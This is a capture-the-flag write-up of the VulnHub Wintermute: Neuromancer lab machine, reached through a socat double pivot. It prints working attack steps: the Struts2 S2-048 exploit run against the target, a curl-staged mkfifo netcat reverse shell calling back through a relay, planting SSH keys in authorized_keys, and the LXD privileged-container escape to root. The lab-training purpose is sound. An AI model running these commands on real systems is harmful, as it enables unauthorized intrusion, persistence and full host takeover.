---
title: "Wintermute: Neuromancer"
date: 2026-10-27
categories: [VulnHub, Medium]
tags: [linux, tomcat, struts2, cve-2017-9791, ognl, RCE, lxd, lxc, privilege escalation, pivoting, port forwarding, double pivot, html entity encoding, reverse shell, searchsploit, python, netcat, socat, ssh, scp]
image:
  path: /assets/img/VulnHub/Wintermute-Neuromancer/banner.webp
  lqip: "data:image/webp;base64,UklGRroAAABXRUJQVlA4IK4AAAAwBQCdASogACAAPu1mqk6ppaOiKA1RMB2JYgAu/8dwGOJ8oAU59qKVhEVdqVPlbOjiIAD++QrQzaiufU1rP4OT2g6Ljl5BPnCNggARxn3XEdsBGag1LY524sK13SuQfHuWkfXxF8sII43/OhFC/1uOxW3vUtDbDsVA6umdBDM1Tpft6nROe95SLxYKT1f+LBJpZCIAYxfMSSL7H7P+MjrbEdizitbCJMSBhlYAAAA="
  alt: "Wintermute: Neuromancer writeup"
lab:
  name: Wintermute
  order: 2
---

Neuromancer is the second half of the **Wintermute: 1** pivoting lab — the machine that only lives on the internal `10.0.0.0/24` network, with no route from my host. I reach it entirely *through* [Straylight](/posts/wintermute-straylight/), which I already rooted and turned into a pivot. From there it's a chain of its own: **Apache Struts2 S2-048** (**CVE-2017-9791**) for a foothold as `ta` — delivered as a reverse shell bounced back through a *second* `socat` relay — stable SSH access, and an **LXD group** membership that is root by design. The hard part here isn't the exploit, it's routing the shell home across two hops; as with Straylight, my scripts and sessions are kept in full.

| Field      | Details        |
|------------|----------------|
| Platform   | VulnHub        |
| Difficulty | Medium         |
| OS         | Linux          |
| IP         | 10.0.0.101 (internal — reached via the Straylight pivot) |
| Download   | [Wintermute: 1](https://www.vulnhub.com/entry/wintermute-1,239/) |
| Date       | October 2026   |

## Tools Used

| Tool        | Description                                                           |
|-------------|-----------------------------------------------------------------------|
| nmap        | Scanning Neuromancer's ports through the pivot                       |
| searchsploit| Located the Struts2 S2-048 exploit                                  |
| Python      | `http.server` staging, the S2-048 exploit, HTML-entity decoding      |
| netcat (nc) | The reverse-shell listener                                           |
| socat       | The second pivot — bouncing the reverse shell back to my host        |
| ssh / scp   | Stable access as `ta` and file transfer through the pivot            |
| lxc         | LXD container privilege escalation to root                           |

## Reaching the Machine

Everything here runs against the hidden host **behind [Straylight](/posts/wintermute-straylight/)**. On that first machine (which I rooted separately) I set up `socat` relays that forward Neuromancer's ports out to my host — so `192.168.57.6:<port>` reaches `10.0.0.101:<port>`:

```bash
# on straylight (the pivot): one relay per port
root@straylight:/tmp$ socat tcp-listen:8080,reuseaddr,fork tcp-connect:10.0.0.101:8080 &
root@straylight:/tmp$ socat tcp-listen:8009,reuseaddr,fork tcp-connect:10.0.0.101:8009 &
root@straylight:/tmp$ socat tcp-listen:34483,reuseaddr,fork tcp-connect:10.0.0.101:34483 &
```

The full pivot setup (second interface, ping sweep, the Bash `/dev/tcp` port scan) is in the [Straylight writeup](/posts/wintermute-straylight/#pivoting-to-neuromancer). From here I treat `192.168.57.6:8080` as Neuromancer's Tomcat.

## Reconnaissance Through the Pivot

Scanning the forwarded ports reveals Neuromancer as if it were local:

```bash
sudo nmap -p8080,8009,34483 -sCV 192.168.57.6 -oN nmap2
# 8009  ajp13   Apache Jserv (v1.3)
# 8080  http    Apache Tomcat 9.0.0.M26
# 34483 ssh     OpenSSH 7.2p2 Ubuntu
```

Straylight's `/root/note.txt` had pointed here: a Tomcat deployment at `/struts2_2.3.15.1-showcase`. That version string is the whole lead — Apache Struts 2.3.x Showcase is a well-known RCE target.

## Initial Access — Apache Struts2 S2-048 (CVE-2017-9791) → `ta`

Apache Struts 2.3.x Showcase is vulnerable to **S2-048 / CVE-2017-9791** — an OGNL injection in the Struts 1 integration plugin that yields RCE. Exploit-DB 42324 automates it:

```bash
searchsploit -m multiple/webapps/42324.py
```

### The double pivot for the reverse shell

There's a second, harder half to the tunnel. The exploit runs *commands* on Neuromancer, but Neuromancer can only reach `10.0.0.x` — **not** my host at `192.168.57.1`. So a reverse shell has to bounce back through Straylight too. I set up a *reverse* relay on Straylight: listen on its internal IP and forward to my host.

```bash
# on straylight: internal :5555  →  my host 192.168.57.1:5555
root@straylight:/tmp$ socat tcp-listen:5555,reuseaddr,fork tcp-connect:192.168.57.1:5555 &
```

A connectivity test confirms the path (Neuromancer → straylight:5555 → host): the S2-048 exploit makes Neuromancer `curl` straylight's internal IP, and it arrives at my host's Python server:

```bash
python3 exploit.py http://192.168.57.6:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action 'curl http://10.0.0.100:5555/'
# on host:  python3 -m http.server 5555  →  "GET / HTTP/1.1" 200
```

A plain `bash -i >& /dev/tcp/...` one-liner didn't take, so I staged a `mkfifo` reverse shell instead: host the script on Straylight (port 9999), have the exploit download, `chmod` and run it, with the callback aimed at `10.0.0.100:5555` (which relays to my host):

```bash
# reverseShell.sh:  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.100 5555 >/tmp/f
python3 exploit.py http://192.168.57.6:8080/.../saveGangster.action 'curl http://10.0.0.100:9999/reverseShell.sh -o /tmp/reverseShell.sh'
python3 exploit.py http://192.168.57.6:8080/.../saveGangster.action 'chmod +x /tmp/reverseShell.sh'
python3 exploit.py http://192.168.57.6:8080/.../saveGangster.action 'sh /tmp/reverseShell.sh'
```

```bash
# host listener
nc -nlvp 5555
Connection received on 192.168.57.6 54128
$ whoami
ta
$ hostname -I
10.0.0.101
```

A shell as **`ta`** on Neuromancer, tunnelled through two socat hops.

### Stable access over SSH

Blind reverse shells are fragile, so I set up key-based SSH through the pivot. First I re-point the SSH relay to a friendlier local port (22 → Neuromancer's 34483), then add my key to `ta`'s `authorized_keys` and connect:

```bash
root@straylight:/tmp$ socat tcp-listen:22,reuseaddr,fork tcp-connect:10.0.0.101:34483 &
```

```bash
ta@neuromancer:~$ ssh-keygen
ta@neuromancer:~$ echo "<my host public key>" > /home/ta/.ssh/authorized_keys
```

```bash
ssh -i id_rsa ta@192.168.57.6    # → neuromancer, via the 22→34483 relay
ta@neuromancer:~$ id
uid=1000(ta) ... groups=1000(ta),...,110(lxd),...
```

## Privilege Escalation — `ta` → `root` (LXD group)

`ta` is a member of the **`lxd`** group, and that is effectively root: LXD lets a group member create containers, and a *privileged* container can mount the **host's filesystem** and be entered as root. The standard route is a minimal Alpine image (built with [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder)), copied over with `scp` through the SSH pivot:

```bash
scp -i ~/.ssh/id_rsa alpine.tar.gz ta@192.168.57.6:/tmp/alpine.tar.gz
```

Then import it, launch a **privileged** container with the host's `/` mounted inside, and drop into a shell:

```bash
ta@neuromancer:/tmp$ lxc image import /tmp/alpine.tar.gz
ta@neuromancer:/tmp$ lxc image alias create privesc <fingerprint>
ta@neuromancer:/tmp$ lxc init privesc escalada -c security.privileged=true
ta@neuromancer:/tmp$ lxc config device add escalada host-root disk source=/ path=/mnt/root recursive=true
ta@neuromancer:/tmp$ lxc start escalada
ta@neuromancer:/tmp$ lxc exec escalada /bin/sh
~ # whoami
root
```

Inside the container we're root, and the host's entire disk is mounted at `/mnt/root` — so the host's `/root` is ours. I read the flag and drop my key into root's `authorized_keys` to get a clean root SSH session on the host:

```bash
~ # cat /mnt/root/root/flag.txt
REDACTED
~ # echo "<my host public key>" > /mnt/root/root/.ssh/authorized_keys
```

```bash
ssh -i .ssh/id_rsa root@192.168.57.6
root@neuromancer:~# whoami
root
```

Root on Neuromancer — both machines of the lab owned, start to finish through the pivot.

### Extra — credential hunting

A sweep of Neuromancer's config files turns up several stored secrets worth noting. Maven's `settings.xml` holds `proxyuser:proxypass` and `repouser:repopwd`, and Tomcat's `tomcat-users.xml` hides **Lady3Jane**'s password behind HTML entities (the author's idea of "security by obscurity"):

```bash
ta@neuromancer:~$ python3 -c 'import html; print(html.unescape("&gt;&#33;&#88;&#120;&#51;&#74;&#97;&#110;&#101;&#120;&#88;&#33;&lt;"))'
# >!Xx3JanexX!<
ta@neuromancer:~$ su lady3jane      # works
```

## Root Proof

| Host        | File             | Proof      |
|-------------|------------------|------------|
| neuromancer | `/root/flag.txt` | `REDACTED` |

## Key Takeaways

- **Chain exploits across the tunnel.** Struts2 S2-048 is a one-shot RCE, but delivering a working reverse shell through a double pivot took staging a `mkfifo` script and pointing every callback at the relay (`10.0.0.100`), never at the unreachable host. On segmented networks, the exploit is the easy part; the shell routing is the work.
- **Pivoting goes both ways.** Reaching Neuromancer took a `socat` forward per port on [Straylight](/posts/wintermute-straylight/) (outward); getting a shell back took a *second* `socat` on Straylight pointing inward to my host. Keeping the two directions straight — who exposes what, to whom — is the core skill of a multi-host network.
- **A version string in a path is a lead.** `/struts2_2.3.15.1-showcase` named both the framework and the exact vulnerable version — `searchsploit` did the rest. Verbose deployment paths and default sample apps (Struts Showcase, Tomcat examples) are RCE waiting to be matched to a CVE.
- **The `lxd` group is root.** Membership in `lxd` let `ta` mount the host's `/` into a privileged container and read/write it as root — no kernel exploit needed. `lxd`, `docker`, `disk`, and similar groups are privilege escalation by design; treat them as equivalent to root access.
